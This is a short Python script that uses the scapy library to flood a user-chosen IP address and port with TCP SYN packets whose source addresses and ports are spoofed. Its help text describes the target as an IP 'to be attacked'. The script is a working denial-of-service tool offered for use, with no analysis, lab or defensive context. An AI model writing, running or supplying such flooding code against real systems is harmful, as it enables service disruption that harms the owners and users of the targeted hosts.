#!/usr/bin/python3

import argparse
from scapy.all import *
import random

parser = argparse.ArgumentParser(description='Flood a specifc ip and port')
## asks for random IP and port to be flooded

parser.add_argument('ip_input', metavar='IP', type=str,
                    help='input an ip to be attacked')
parser.add_argument('port_input', metavar='Port', type=int,
                    help='input an port to be flooded')
args = parser.parse_args()

##### Logic #####

rand_ips=[("192.168.1."+str(random.randint(0,255))) for _ in range(10)]
rand_ports=[random.randint(1024,65535) for _ in range(10)]
send(IP(src=rand_ips,dst=args.ip_input)/TCP(flags='S',sport=rand_ports,dport=args.port_input))

## Sends out 100 packets
